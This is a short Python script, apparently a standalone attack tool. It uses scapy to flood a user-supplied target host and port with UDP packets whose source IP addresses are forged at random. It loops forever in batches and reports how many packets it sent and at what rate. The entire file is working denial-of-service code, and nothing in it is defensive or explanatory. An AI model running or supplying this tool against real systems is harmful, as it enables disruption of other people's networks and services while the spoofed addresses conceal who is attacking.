#!/usr/bin/env python
"""
Spam target with spoofed UDP packets from random source IP addresses
"""
import sys
import random
import datetime
from Queue import Queue
from scapy.all import IP,UDP,send

def randomoctet():
    return random.choice(range(1,254))

def randomip():
    ip="{}.{}.{}.{}".format(randomoctet(),randomoctet(),randomoctet(),randomoctet())
    return ip

def main(packetcounter):
    if not len(sys.argv) == 2:
        print "Provide target as the first argument."
        print "Target example: 127.0.0.1:22"
        sys.exit(1)
    target = sys.argv[1]
    target = target.split(":")
    dst = target[0]
    dport = int(target[1])
    while True:
        packets = []
        src=randomip()
        # send packets in 100 packet batches
        for i in range(1,100):
            sport=int("{}".format(i))
            packets.append(IP(ttl=5,src=src,dst=dst)/UDP(sport=sport,dport=dport))
            print "Source {}:{} -> dst: {}:{}".format(src,sport,dst,dport)
            packetcounter.put(i)
        send(packets)

if __name__ == "__main__":
    start_time = datetime.datetime.now()
    packetcounter=Queue()
    try:
        main(packetcounter)
    except KeyboardInterrupt:
        packets_sent= packetcounter.qsize()
        running_time_delta = datetime.datetime.now() - start_time
        running_time = running_time_delta.total_seconds()
        rate = packets_sent / running_time
        print "Ctrl-c"
        print "Ran for {} seconds".format(running_time)
        print "Sent {} packets".format(packets_sent)
        print "Rate: {} packets/s".format(rate)
